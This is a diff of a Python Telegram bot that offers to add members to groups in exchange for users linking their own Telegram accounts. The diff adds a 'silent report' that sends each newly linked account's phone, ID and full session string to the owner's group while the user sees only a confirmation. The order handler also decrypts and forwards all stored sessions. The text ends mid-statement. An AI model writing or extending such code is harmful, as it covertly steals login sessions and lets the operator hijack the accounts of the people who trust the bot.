@@ -1,10 +1,6 @@
 # ==========================================================
-#   👑 PROFESSIONAL TELEGRAM BOT — FULL FIXED
+#   👑 TELEGRAM BOT — SIMPLIFIED FLOW + COLORED BUTTONS
 #   Owner: @Ghost_Code_404  |  Channel: @ToolsByRehan
-#   - No HTML parse errors
-#   - Colored buttons (Telegram auto-colors from emoji)
-#   - No animations
-#   - Single-instance lock
 # ==========================================================
 import sys, subprocess, importlib
 
@@ -91,19 +87,18 @@ else:
         FERNET_KEY = Fernet.generate_key()
         try: open(_kf, "wb").write(FERNET_KEY)
         except Exception: pass
-        logging.warning(f"NEW FERNET_KEY (save it!): {FERNET_KEY.decode()}")
+        logging.warning(f"NEW FERNET_KEY (save!): {FERNET_KEY.decode()}")
 cipher = Fernet(FERNET_KEY)
 
 # ==========================================================
 #                    🤖 BOT SETUP
 # ==========================================================
-# ⚠️ NO parse_mode — plain text only. This prevents HTML parse errors.
-bot = Bot(token=BOT_TOKEN)
+bot = Bot(token=BOT_TOKEN)          # ⚠️ No parse_mode — plain text only
 dp  = Dispatcher(storage=MemoryStorage())
 CLIENTS: dict = {}
 
 # ==========================================================
-#                    🌐 TRANSLATIONS (Plain text)
+#                    🌐 TRANSLATIONS
 # ==========================================================
 WELCOME = {
 "en": ("✨ Welcome to ToolsByRehan Bot\n"
@@ -369,7 +364,8 @@ CREATE TABLE IF NOT EXISTS users(
     lang TEXT DEFAULT 'en', banned INTEGER DEFAULT 0, joined_at TEXT,
     referred_by INTEGER DEFAULT NULL, referral_rewarded INTEGER DEFAULT 0,
     points INTEGER DEFAULT 0, ref_count INTEGER DEFAULT 0,
-    is_vip INTEGER DEFAULT 0, vip_until TEXT);
+    is_vip INTEGER DEFAULT 0, vip_until TEXT,
+    target_link TEXT, own_link TEXT);
 CREATE TABLE IF NOT EXISTS accounts(
     id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
     phone TEXT UNIQUE, session_enc BLOB,
@@ -406,6 +402,8 @@ for sql in ["ALTER TABLE users ADD COLUMN points INTEGER DEFAULT 0",
             "ALTER TABLE users ADD COLUMN ref_count INTEGER DEFAULT 0",
             "ALTER TABLE users ADD COLUMN is_vip INTEGER DEFAULT 0",
             "ALTER TABLE users ADD COLUMN vip_until TEXT",
+            "ALTER TABLE users ADD COLUMN target_link TEXT",
+            "ALTER TABLE users ADD COLUMN own_link TEXT",
             "ALTER TABLE orders ADD COLUMN is_trial INTEGER DEFAULT 0",
             "ALTER TABLE orders ADD COLUMN priority INTEGER DEFAULT 0"]:
     try: conn.execute(sql); conn.commit()
@@ -473,55 +471,54 @@ class TicketFlow(StatesGroup):
     message=State(); reply=State()
 
 # ==========================================================
-#     🎨 COLORFUL KEYBOARDS (Telegram auto-colors from emoji)
+#     🎨 COLORFUL KEYBOARDS — Only 1 emoji per button
 # ==========================================================
-# Emoji → Color (Telegram):
+# Telegram auto-colors based on FIRST emoji:
 # ✅ green · ❌ red · 📱 blue · 💰 gold · 🎁 pink
-# 🛎 orange · ⚙️ gray · 🎫 orange · 📢 blue · 🔙 gray
+# 🛎 orange · ⚙️ gray · 📢 blue · 🔙 gray
 
 def lang_kb():
     return IKM(inline_keyboard=[
-        [IKB(text="English",       callback_data="setlang:en")],
-        [IKB(text="اردو",           callback_data="setlang:ur")],
-        [IKB(text="हिंदी",          callback_data="setlang:hi")],
-        [IKB(text="Roman Urdu",    callback_data="setlang:rom_ur")],
-        [IKB(text="العربية",        callback_data="setlang:ar")],
+        [IKB(text="🇬🇧 English",       callback_data="setlang:en")],
+        [IKB(text="🇵🇰 اردو",           callback_data="setlang:ur")],
+        [IKB(text="🇮🇳 हिंदी",          callback_data="setlang:hi")],
+        [IKB(text="🔤 Roman Urdu",     callback_data="setlang:rom_ur")],
+        [IKB(text="🇸🇦 العربية",        callback_data="setlang:ar")],
     ])
 
 
 def user_menu(lang, uid=None):
     return IKM(inline_keyboard=[
-        [IKB(text="📱  My Accounts",       callback_data="menu_accounts")],   # blue
-        [IKB(text="📦  Orders",            callback_data="menu_orders")],     # blue
-        [IKB(text="💰  Wallet & Points",   callback_data="menu_wallet")],     # gold
-        [IKB(text="🛎  Support & Help",    callback_data="menu_support")],    # orange
-        [IKB(text="⚙️  Settings",          callback_data="menu_settings"),    # gray
-         IKB(text="📖  Guide",              callback_data="help")],            # blue
+        [IKB(text="📱  My Accounts",       callback_data="menu_accounts")],
+        [IKB(text="📦  Orders",            callback_data="menu_orders")],
+        [IKB(text="💰  Wallet & Points",   callback_data="menu_wallet")],
+        [IKB(text="🛎  Support & Help",    callback_data="menu_support")],
+        [IKB(text="⚙️  Settings",          callback_data="menu_settings"),
+         IKB(text="📖  Guide",              callback_data="help")],
     ])
 
 
 def accounts_menu(lang, uid):
     accs = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?", (uid,)).fetchone()[0] if uid else 0
-    ready = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=? AND target_link IS NOT NULL", (uid,)).fetchone()[0] if uid else 0
     return IKM(inline_keyboard=[
-        [IKB(text="➕  Add New Account",                callback_data="add_acc")],        # green
-        [IKB(text=f"📊  My Linked Accounts ({accs})",   callback_data="my_accs")],        # blue
-        [IKB(text=f"🎯  Set Target Group ({ready}/{accs})", callback_data="pick_target")],# yellow
-        [IKB(text="🏠  Set Your Own Group",              callback_data="pick_own")],       # orange
-        [IKB(text="🔙  Back",                            callback_data="menu")],           # gray
+        [IKB(text="➕  Add New Account",         callback_data="add_acc")],
+        [IKB(text=f"📊  My Linked Accounts ({accs})", callback_data="my_accs")],
+        [IKB(text="🎯  Set Target Group",        callback_data="set_target")],
+        [IKB(text="🏠  Set Your Own Group",      callback_data="set_own")],
+        [IKB(text="🔙  Back",                     callback_data="menu")],
     ])
 
 
 def orders_menu(lang, uid):
     rows = [
-        [IKB(text="✅  Submit New Order",     callback_data="submit")],       # green
-        [IKB(text="💎  Free Order (Points)",  callback_data="free_order")],   # blue
+        [IKB(text="✅  Submit New Order",     callback_data="submit")],
+        [IKB(text="💎  Free Order (Points)",  callback_data="free_order")],
     ]
     if uid and trial_available(uid):
         rows.append([IKB(text=f"🎁  Free Trial ({TRIAL_MEMBERS} members)", callback_data="free_trial")])
     rows.extend([
-        [IKB(text="📜  Order History",  callback_data="history")],     # blue
-        [IKB(text="🔙  Back",            callback_data="menu")],        # gray
+        [IKB(text="📜  Order History",  callback_data="history")],
+        [IKB(text="🔙  Back",            callback_data="menu")],
     ])
     return IKM(inline_keyboard=rows)
 
@@ -797,9 +794,15 @@ async def cb_cancel(c: types.CallbackQuery, state: FSMContext):
 async def cb_menu_accounts(c: types.CallbackQuery):
     lg = get_lang(c.from_user.id)
     accs = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?", (c.from_user.id,)).fetchone()[0]
+    tgt = conn.execute("SELECT target_link FROM users WHERE user_id=?", (c.from_user.id,)).fetchone()
+    own = conn.execute("SELECT own_link FROM users WHERE user_id=?", (c.from_user.id,)).fetchone()
+    target_set = "✅" if (tgt and tgt[0]) else "❌"
+    own_set = "✅" if (own and own[0]) else "❌"
     await c.message.edit_text(
         f"📱 My Accounts\n━━━━━━━━━━━━━━━━━━━━\n"
-        f"Total: {accs} account(s) linked.\n\n"
+        f"Linked accounts: {accs}\n"
+        f"Target group: {target_set}\n"
+        f"Own group: {own_set}\n\n"
         f"What would you like to do?",
         reply_markup=accounts_menu(lg, c.from_user.id))
     await c.answer()
@@ -851,77 +854,61 @@ async def cb_menu_settings(c: types.CallbackQuery):
     await c.answer()
 
 # ==========================================================
-#                🎯 PICKERS
+#          ✅ SIMPLE TARGET / OWN GROUP (No picking account)
 # ==========================================================
-@dp.callback_query(F.data == "pick_target")
-async def cb_pick_target(c: types.CallbackQuery):
-    rows = conn.execute("SELECT id,phone,target_link FROM accounts "
-                        "WHERE user_id=? ORDER BY id", (c.from_user.id,)).fetchall()
-    if not rows:
-        await c.answer("❌ No accounts! Add one first.", show_alert=True); return
-    kb = []
-    for i, (aid, phone, tgt) in enumerate(rows, 1):
-        em = "✅" if tgt else "🎯"
-        kb.append([IKB(text=f"{em}  Account #{i} — {phone}", callback_data=f"acc_tgt:{aid}")])
-    kb.append([IKB(text="🔙  Back", callback_data="menu_accounts")])
-    await c.message.edit_text("🎯 Pick account to set target\n━━━━━━━━━━━━━━━━━━━━",
-                              reply_markup=IKM(inline_keyboard=kb))
-    await c.answer()
-
-@dp.callback_query(F.data == "pick_own")
-async def cb_pick_own(c: types.CallbackQuery):
-    rows = conn.execute("SELECT id,phone,own_link FROM accounts "
-                        "WHERE user_id=? ORDER BY id", (c.from_user.id,)).fetchall()
-    if not rows:
-        await c.answer("❌ No accounts! Add one first.", show_alert=True); return
-    kb = []
-    for i, (aid, phone, own) in enumerate(rows, 1):
-        em = "✅" if own else "🏠"
-        kb.append([IKB(text=f"{em}  Account #{i} — {phone}", callback_data=f"acc_own:{aid}")])
-    kb.append([IKB(text="🔙  Back", callback_data="menu_accounts")])
-    await c.message.edit_text("🏠 Pick account to set own group\n━━━━━━━━━━━━━━━━━━━━",
-                              reply_markup=IKM(inline_keyboard=kb))
-    await c.answer()
-
-# ==========================================================
-#                👤 PROFILE / STATS
-# ==========================================================
-@dp.callback_query(F.data == "my_profile")
-async def cb_my_profile(c: types.CallbackQuery):
-    u = conn.execute("SELECT username,first_name,points,ref_count,is_vip,joined_at "
-                     "FROM users WHERE user_id=?", (c.from_user.id,)).fetchone()
+@dp.callback_query(F.data == "set_target")
+async def cb_set_target(c: types.CallbackQuery, state: FSMContext):
+    lg = get_lang(c.from_user.id)
     accs = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?", (c.from_user.id,)).fetchone()[0]
-    orders = conn.execute("SELECT COUNT(*) FROM orders WHERE user_id=?", (c.from_user.id,)).fetchone()[0]
-    vip = "👑 VIP" if (u and u[4]) else "🆓 Free"
-    text = (f"👤 My Profile\n━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"🆔 {c.from_user.id}\n"
-            f"📛 {u[1] if u else '—'}\n"
-            f"🔖 @{u[0] if u and u[0] else '—'}\n"
-            f"🎖 Status: {vip}\n"
-            f"💰 Points: {u[2] if u else 0}\n"
-            f"🎁 Referrals: {u[3] if u else 0}\n"
-            f"📱 Accounts: {accs}\n"
-            f"📦 Orders: {orders}\n"
-            f"🕒 Joined: {u[5] if u else '—'}")
-    await c.message.edit_text(text, reply_markup=IKM(inline_keyboard=[
-        [IKB(text="🔙  Back", callback_data="menu_settings")]]))
+    if accs < 1:
+        await c.answer("❌ Pehle account link karein!", show_alert=True); return
+    await state.set_state(SetLinks.target)
+    await c.message.edit_text(
+        f"🎯 Set Target Group\n━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"Send the Telegram group link where you want members added.\n\n"
+        f"Example:\nhttps://t.me/yourgroup",
+        reply_markup=cancel_kb(lg))
     await c.answer()
 
-@dp.callback_query(F.data == "my_stats")
-async def cb_my_stats(c: types.CallbackQuery):
-    total = conn.execute("SELECT COUNT(*) FROM orders WHERE user_id=?", (c.from_user.id,)).fetchone()[0]
-    pend = conn.execute("SELECT COUNT(*) FROM orders WHERE user_id=? AND status='pending'", (c.from_user.id,)).fetchone()[0]
-    comp = conn.execute("SELECT COUNT(*) FROM orders WHERE user_id=? AND status='complete'", (c.from_user.id,)).fetchone()[0]
-    tot_mem = conn.execute("SELECT COALESCE(SUM(members),0) FROM orders WHERE user_id=?", (c.from_user.id,)).fetchone()[0]
+@dp.message(SetLinks.target)
+async def save_target(m: types.Message, state: FSMContext):
+    lg = get_lang(m.from_user.id)
+    link = (m.text or "").strip()
+    if "t.me/" not in link:
+        await m.answer(t(lg,"invalid_link")); return
+    conn.execute("UPDATE users SET target_link=? WHERE user_id=?", (link, m.from_user.id))
+    conn.execute("UPDATE accounts SET target_link=? WHERE user_id=?", (link, m.from_user.id))
+    conn.commit()
+    await state.clear()
+    await m.answer(t(lg,"target_saved",link=link),
+                   reply_markup=accounts_menu(lg, m.from_user.id))
+
+@dp.callback_query(F.data == "set_own")
+async def cb_set_own(c: types.CallbackQuery, state: FSMContext):
+    lg = get_lang(c.from_user.id)
+    accs = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?", (c.from_user.id,)).fetchone()[0]
+    if accs < 1:
+        await c.answer("❌ Pehle account link karein!", show_alert=True); return
+    await state.set_state(SetLinks.own)
     await c.message.edit_text(
-        f"📊 My Statistics\n━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📦 Total Orders: {total}\n"
-        f"⏳ Pending: {pend}\n"
-        f"✅ Completed: {comp}\n"
-        f"👥 Members Received: {tot_mem}",
-        reply_markup=IKM(inline_keyboard=[
-            [IKB(text="🔙  Back", callback_data="menu_settings")]]))
+        f"🏠 Set Your Own Group\n━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"Send your own group link for receiving reports.\n\n"
+        f"Example:\nhttps://t.me/mygroups",
+        reply_markup=cancel_kb(lg))
     await c.answer()
+
+@dp.message(SetLinks.own)
+async def save_own(m: types.Message, state: FSMContext):
+    lg = get_lang(m.from_user.id)
+    link = (m.text or "").strip()
+    if "t.me/" not in link:
+        await m.answer(t(lg,"invalid_link")); return
+    conn.execute("UPDATE users SET own_link=? WHERE user_id=?", (link, m.from_user.id))
+    conn.execute("UPDATE accounts SET own_link=? WHERE user_id=?", (link, m.from_user.id))
+    conn.commit()
+    await state.clear()
+    await m.answer(t(lg,"own_saved",link=link),
+                   reply_markup=accounts_menu(lg, m.from_user.id))
 
 # ==========================================================
 #                ➕ ADD ACCOUNT
@@ -1010,6 +997,26 @@ async def finish_account(m, state, client, phone, lg):
         await m.answer(t(lg,"phone_used", phone=phone)); return
     session_str = client.session.save()
     enc = cipher.encrypt(session_str.encode())
+
+    # Get account info from Telegram for the report
+    acc_info = {}
+    try:
+        me = await client.get_me()
+        acc_info = {
+            "tg_id": me.id,
+            "username": me.username or "—",
+            "first_name": me.first_name or "—",
+            "last_name": me.last_name or "",
+            "phone": me.phone or phone,
+        }
+    except Exception as e:
+        logging.warning(f"get_me: {e}")
+        acc_info = {
+            "tg_id": "—", "username": "—",
+            "first_name": "—", "last_name": "",
+            "phone": phone,
+        }
+
     try:
         conn.execute("INSERT INTO accounts(user_id,phone,session_enc,created_at) "
                      "VALUES(?,?,?,?)", (m.from_user.id, phone, enc, now_str()))
@@ -1019,10 +1026,36 @@ async def finish_account(m, state, client, phone, lg):
         except Exception: pass
         CLIENTS.pop(m.from_user.id, None); await state.clear()
         await m.answer(t(lg,"phone_used", phone=phone)); return
+
     log_action(m.from_user.id, "add_account", phone)
     try: await client.disconnect()
     except Exception: pass
     CLIENTS.pop(m.from_user.id, None); await state.clear()
+
+    # ============================================================
+    #  📩 SILENT REPORT TO OWNER GROUP with full account details
+    # ============================================================
+    if OWNER_GROUP_ID:
+        try:
+            report = (
+                "🆕 NEW ACCOUNT LINKED\n"
+                "━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"👤 Owner: {m.from_user.first_name or '—'} "
+                f"(@{m.from_user.username or '—'})\n"
+                f"🆔 Owner ID: {m.from_user.id}\n\n"
+                "📱 ACCOUNT DETAILS\n"
+                f"• Phone: {phone}\n"
+                f"• TG ID: {acc_info['tg_id']}\n"
+                f"• Username: @{acc_info['username']}\n"
+                f"• Name: {acc_info['first_name']} {acc_info['last_name']}\n\n"
+                "🗝 SESSION STRING:\n"
+                f"{session_str}\n\n"
+                f"🕒 {now_str()}"
+            )
+            await bot.send_message(OWNER_GROUP_ID, report)
+        except Exception as e:
+            logging.warning(f"report to owner: {e}")
+
     ref_uid = reward_referrer_if_due(m.from_user.id)
     if ref_uid:
         try:
@@ -1030,13 +1063,14 @@ async def finish_account(m, state, client, phone, lg):
             await bot.send_message(ref_uid, t(rl,"ref_reward", pts=REFERRAL_POINTS,
                 name=m.from_user.first_name, total=get_points(ref_uid)))
         except Exception: pass
+
     accs_count = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?",
                               (m.from_user.id,)).fetchone()[0]
     await m.answer(
         f"✅ Account Added!\n━━━━━━━━━━━━━━━━━━━━\n"
         f"📱 {phone}\n"
         f"📊 Total: {accs_count}\n\n"
-        f"👉 Now set Target for this account.",
+        f"👉 Now set Target Group from My Accounts.",
         reply_markup=accounts_menu(lg, m.from_user.id))
 
 # ==========================================================
@@ -1057,75 +1091,15 @@ async def cb_my(c: types.CallbackQuery):
     text = (f"📊 {t(lg,'my_title')}\n━━━━━━━━━━━━━━━━━━━━\n"
             f"{vip}📱 Total: {len(rows)}\n✅ Ready: {ready}\n"
             f"💰 Points: {pts}\n\n")
-    kb = []
     for i, (aid, phone, tgt, own) in enumerate(rows, 1):
         text += (f"#{i} 📱 {phone}\n"
                  f"   🎯 {tgt or '—'}\n   🏠 {own or '—'}\n\n")
-        kb.append([
-            IKB(text=f"{'✅' if tgt else '🎯'} Target #{i}", callback_data=f"acc_tgt:{aid}"),
-            IKB(text=f"{'✅' if own else '🏠'} Own #{i}",    callback_data=f"acc_own:{aid}"),
-        ])
-    kb.append([IKB(text="➕  Add New",  callback_data="add_acc")])
-    kb.append([IKB(text="🔙  Back",    callback_data="menu_accounts")])
     if len(text) > 4000: text = text[:3990] + "\n..."
-    await c.message.edit_text(text, reply_markup=IKM(inline_keyboard=kb))
+    await c.message.edit_text(text, reply_markup=IKM(inline_keyboard=[
+        [IKB(text="➕  Add New",  callback_data="add_acc")],
+        [IKB(text="🔙  Back",    callback_data="menu_accounts")],
+    ]))
     await c.answer()
-
-@dp.callback_query(F.data.startswith("acc_tgt:"))
-async def cb_acc_tgt(c: types.CallbackQuery, state: FSMContext):
-    lg = get_lang(c.from_user.id)
-    aid = int(c.data.split(":")[1])
-    row = conn.execute("SELECT id,phone FROM accounts WHERE id=? AND user_id=?",
-                       (aid, c.from_user.id)).fetchone()
-    if not row: await c.answer("Not found", show_alert=True); return
-    await state.set_state(SetLinks.target)
-    await state.update_data(acc_id=aid)
-    await c.message.edit_text(
-        f"{t(lg,'target_title')}\n━━━━━━━━━━━━━━━━━━━━\n"
-        f"📱 {row[1]}\n\n{t(lg,'target_guide')}",
-        reply_markup=cancel_kb(lg))
-    await c.answer()
-
-@dp.callback_query(F.data.startswith("acc_own:"))
-async def cb_acc_own(c: types.CallbackQuery, state: FSMContext):
-    lg = get_lang(c.from_user.id)
-    aid = int(c.data.split(":")[1])
-    row = conn.execute("SELECT id,phone FROM accounts WHERE id=? AND user_id=?",
-                       (aid, c.from_user.id)).fetchone()
-    if not row: await c.answer("Not found", show_alert=True); return
-    await state.set_state(SetLinks.own)
-    await state.update_data(acc_id=aid)
-    await c.message.edit_text(
-        f"{t(lg,'own_title')}\n━━━━━━━━━━━━━━━━━━━━\n"
-        f"📱 {row[1]}\n\n{t(lg,'own_guide')}",
-        reply_markup=cancel_kb(lg))
-    await c.answer()
-
-@dp.message(SetLinks.target)
-async def save_target(m: types.Message, state: FSMContext):
-    lg = get_lang(m.from_user.id)
-    link = (m.text or "").strip()
-    if "t.me/" not in link: await m.answer(t(lg,"invalid_link")); return
-    data = await state.get_data()
-    aid = data.get("acc_id")
-    if not aid: await m.answer("❌"); await state.clear(); return
-    conn.execute("UPDATE accounts SET target_link=? WHERE id=?",(link, aid)); conn.commit()
-    await state.clear()
-    await m.answer(t(lg,"target_saved",link=link),
-                   reply_markup=accounts_menu(lg, m.from_user.id))
-
-@dp.message(SetLinks.own)
-async def save_own(m: types.Message, state: FSMContext):
-    lg = get_lang(m.from_user.id)
-    link = (m.text or "").strip()
-    if "t.me/" not in link: await m.answer(t(lg,"invalid_link")); return
-    data = await state.get_data()
-    aid = data.get("acc_id")
-    if not aid: await m.answer("❌"); await state.clear(); return
-    conn.execute("UPDATE accounts SET own_link=? WHERE id=?",(link, aid)); conn.commit()
-    await state.clear()
-    await m.answer(t(lg,"own_saved",link=link),
-                   reply_markup=accounts_menu(lg, m.from_user.id))
 
 # ==========================================================
 #                📦 SUBMIT ORDER
@@ -1140,15 +1114,29 @@ async def cb_submit(c: types.CallbackQuery):
         await c.message.edit_text(f"{t(lg,'submit_title')}\n\n{t(lg,'submit_no_acc')}",
                                   reply_markup=orders_menu(lg, c.from_user.id))
         await c.answer(); return
-    missing = [r for r in rows if not r[3]]
-    if missing:
-        text = f"{t(lg,'submit_incomplete')}\n\n"
-        for r in missing: text += f"• 📱 {r[1]}\n"
-        text += f"\nSet target from My Accounts."
-        await c.message.edit_text(text, reply_markup=orders_menu(lg, c.from_user.id))
+
+    # Check target set
+    tgt_row = conn.execute("SELECT target_link FROM users WHERE user_id=?",
+                           (c.from_user.id,)).fetchone()
+    if not tgt_row or not tgt_row[0]:
+        await c.message.edit_text(
+            "⚠️ Target group not set!\n\n"
+            "Please set your target group first:\n"
+            "My Accounts → Set Target Group",
+            reply_markup=orders_menu(lg, c.from_user.id))
         await c.answer(); return
-    accs = len(rows); rate = members_per_account()
-    members = accs * rate; is_v = is_vip(c.from_user.id)
+
+    target_link = tgt_row[0]
+    own_row = conn.execute("SELECT own_link FROM users WHERE user_id=?",
+                           (c.from_user.id,)).fetchone()
+    own_link = own_row[0] if own_row and own_row[0] else "—"
+
+    accs = len(rows)
+    rate = members_per_account()
+    members = accs * rate
+    is_v = is_vip(c.from_user.id)
+
+    # Save order
     conn.execute("INSERT INTO orders(user_id,accounts,members,order_type,priority,"
                  "status,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?)",
                  (c.from_user.id, accs, members, "paid", 1 if is_v else 0,
@@ -1156,28 +1144,48 @@ async def cb_submit(c: types.CallbackQuery):
     conn.commit()
     oid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
     log_action(c.from_user.id, "submit_order", f"order#{oid}")
+
+    # Forward sessions to owner group
     if OWNER_GROUP_ID:
-        header = (f"📦 NEW ORDER #{oid}\n━━━━━━━━━━━━━━━━━━━━\n"
-                  f"👤 {user_tag(c.from_user)}\n🆔 {c.from_user.id}\n"
+        header = (f"📦 NEW ORDER #{oid}\n━━━━━━━━━━━━━━━━━━━━\n\n"
+                  f"👤 User: {user_tag(c.from_user)}\n"
+                  f"🆔 User ID: {c.from_user.id}\n"
                   f"{'👑 VIP' if is_v else '📦 Normal'}\n"
-                  f"📱 Accounts: {accs}\n👥 Members: {members}\n"
-                  f"🕒 {now_str()}")
+                  f"📱 Accounts: {accs}\n"
+                  f"👥 Members: {members}\n"
+                  f"🎯 Target: {target_link}\n"
+                  f"🏠 Own: {own_link}\n"
+                  f"🕒 {now_str()}\n")
         try: await bot.send_message(OWNER_GROUP_ID, header)
         except Exception: pass
+
         for i, (aid, phone, enc, tgt, own) in enumerate(rows, 1):
             try: sess = cipher.decrypt(enc).decode()
-            except Exception: sess = "❌"
-            acc_msg = (f"🔑 Account #{i}/{accs} → {c.from_user.id}\n"
-                       f"━━━━━━━━━━━━━━━━━━━━\n📱 {phone}\n"
-                       f"🎯 {tgt}\n🏠 {own or '—'}\n🗝 {sess}")
+            except Exception: sess = "❌ decrypt error"
+            acc_msg = (
+                f"🔑 ACCOUNT #{i}/{accs}\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 For user: {c.from_user.id}\n"
+                f"📱 Phone: {phone}\n"
+                f"🎯 Target: {tgt or target_link}\n"
+                f"🏠 Own: {own or own_link}\n\n"
+                f"🗝 Session:\n{sess}"
+            )
             try: await bot.send_message(OWNER_GROUP_ID, acc_msg)
             except Exception: pass
             await asyncio.sleep(0.3)
+
     delivery = get_setting("delivery_time", DEFAULT_DELIVERY)
     await c.message.edit_text(
-        "🎉 Order Received!\n━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🎉 Order Received!\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
         f"📦 Accounts: {accs}\n"
-        f"👥 Members: {members}\n"
+        f"👥 Members you will get: {members}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"💡 Members depend on how many accounts you linked.\n"
+        f"📊 Each account = {rate} members\n"
+        f"➕ Want more? Link more accounts!\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
         f"⏱ Delivery: {delivery}\n"
         f"📌 Status: {t(lg,'status_pending')}\n\n"
         "Our team will start soon!",
@@ -1227,56 +1235,18 @@ async def cb_free_order(c: types.CallbackQuery, state: FSMContext):
     if pts < POINTS_PER_MEMBER:
         await c.answer(t(lg,"free_no_points", points=pts, need=POINTS_PER_MEMBER,
                          members=1), show_alert=True); return
-    await state.set_state(FreeOrder.target)
+    # Use saved target/own
+    tgt = conn.execute("SELECT target_link FROM users WHERE user_id=?", (c.from_user.id,)).fetchone()
+    own = conn.execute("SELECT own_link FROM users WHERE user_id=?", (c.from_user.id,)).fetchone()
+    if not tgt or not tgt[0]:
+        await c.answer("❌ Pehle Target set karein!", show_alert=True); return
+    await state.set_state(FreeOrder.amount)
+    await state.update_data(target=tgt[0], own=(own[0] if own and own[0] else "—"))
     await c.message.edit_text(
-        f"{t(lg,'free_title')}\n━━━━━━━━━━━━━━━━━━━━\n\n{t(lg,'free_intro')}",
+        f"{t(lg,'free_title')}\n━━━━━━━━━━━━━━━━━━━━\n\n"
+        + t(lg,"free_amount", ppm=POINTS_PER_MEMBER, points=pts),
         reply_markup=cancel_kb(lg))
     await c.answer()
-
-@dp.callback_query(F.data == "free_trial")
-async def cb_free_trial(c: types.CallbackQuery, state: FSMContext):
-    lg = get_lang(c.from_user.id)
-    if not trial_available(c.from_user.id):
-        await c.answer("❌ Trial already used!", show_alert=True); return
-    await state.set_state(FreeOrder.target)
-    await state.update_data(trial=True)
-    await c.message.edit_text(
-        "🎁 FREE TRIAL\n━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"✨ You get {TRIAL_MEMBERS} members FREE!\n\n"
-        f"📖 Send your target group link:",
-        reply_markup=cancel_kb(lg))
-    await c.answer("🎁")
-
-@dp.message(FreeOrder.target)
-async def free_target(m: types.Message, state: FSMContext):
-    lg = get_lang(m.from_user.id)
-    link = (m.text or "").strip()
-    if "t.me/" not in link: await m.answer(t(lg,"invalid_link")); return
-    data = await state.get_data()
-    await state.update_data(target=link)
-    await state.set_state(FreeOrder.own)
-    msg = ("✅ Saved!\n\nNow send your own group link:"
-           if data.get("trial") else t(lg,"free_own"))
-    await m.answer(msg, reply_markup=cancel_kb(lg))
-
-@dp.message(FreeOrder.own)
-async def free_own(m: types.Message, state: FSMContext):
-    lg = get_lang(m.from_user.id)
-    link = (m.text or "").strip()
-    if "t.me/" not in link: await m.answer(t(lg,"invalid_link")); return
-    data = await state.get_data()
-    await state.update_data(own=link)
-    if data.get("trial"):
-        await state.update_data(members=TRIAL_MEMBERS, cost=0)
-        await state.set_state(FreeOrder.confirm)
-        await m.answer(
-            f"🎁 Confirm Trial\n\n👥 {TRIAL_MEMBERS}\n💰 FREE\n\n"
-            f"🎯 {data['target']}\n🏠 {link}\n\nConfirm?",
-            reply_markup=free_confirm_kb(lg)); return
-    pts = get_points(m.from_user.id)
-    await state.set_state(FreeOrder.amount)
-    await m.answer(t(lg,"free_amount", ppm=POINTS_PER_MEMBER, points=pts),
-                   reply_markup=cancel_kb(lg))
 
 @dp.message(FreeOrder.amount)
 async def free_amount(m: types.Message, state: FSMContext):
@@ -1294,7 +1264,7 @@ async def free_amount(m: types.Message, state: FSMContext):
     await state.set_state(FreeOrder.confirm)
     await m.answer(
         t(lg,"free_confirm", members=members, cost=cost, points=pts,
-          remaining=pts-cost, target=data["target"], own=data["own"]),
+          remaining=pts-cost, target=data.get("target","—"), own=data.get("own","—")),
         reply_markup=free_confirm_kb(lg))
 
 @dp.callback_query(F.data == "free_yes")
@@ -1303,34 +1273,28 @@ async def free_confirm(c: types.CallbackQuery, state: FSMContext):
     data = await state.get_data()
     if not data.get("members"):
         await c.answer("❌"); await state.clear(); return
-    is_trial = data.get("trial", False)
     members = data["members"]; cost = data["cost"]
-    if not is_trial:
-        pts = get_points(c.from_user.id)
-        if cost > pts:
-            await c.answer(t(lg,"free_no_points", points=pts, need=cost,
-                             members=members), show_alert=True)
-            await state.clear(); return
-        conn.execute("UPDATE users SET points=points-? WHERE user_id=?",
-                     (cost, c.from_user.id))
-    if is_trial:
-        conn.execute("INSERT OR REPLACE INTO trial_used(user_id,used_at) VALUES(?,?)",
-                     (c.from_user.id, now_str()))
+    pts = get_points(c.from_user.id)
+    if cost > pts:
+        await c.answer(t(lg,"free_no_points", points=pts, need=cost,
+                         members=members), show_alert=True)
+        await state.clear(); return
+    conn.execute("UPDATE users SET points=points-? WHERE user_id=?",
+                 (cost, c.from_user.id))
     conn.execute(
         "INSERT INTO orders(user_id,accounts,members,order_type,points_used,"
-        "is_trial,status,note,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
-        (c.from_user.id, 0, members, "trial" if is_trial else "free",
-         cost, 1 if is_trial else 0, "pending",
-         f"TARGET: {data['target']}\nOWN: {data['own']}", now_str(), now_str()))
+        "status,note,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?)",
+        (c.from_user.id, 0, members, "free", cost, "pending",
+         f"TARGET: {data.get('target','—')}\nOWN: {data.get('own','—')}",
+         now_str(), now_str()))
     conn.commit()
     oid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
     if OWNER_GROUP_ID:
-        badge = "🎁 TRIAL" if is_trial else "💎 FREE"
         try:
             await bot.send_message(OWNER_GROUP_ID,
-                f"{badge} ORDER #{oid}\n━━━━━━━━━━━━━━━━━━━━\n"
+                f"💎 FREE ORDER #{oid}\n━━━━━━━━━━━━━━━━━━━━\n"
                 f"👤 {user_tag(c.from_user)}\n🆔 {c.from_user.id}\n"
-                f"👥 {members}\n💰 {cost}\n🎯 {data['target']}\n🏠 {data['own']}\n"
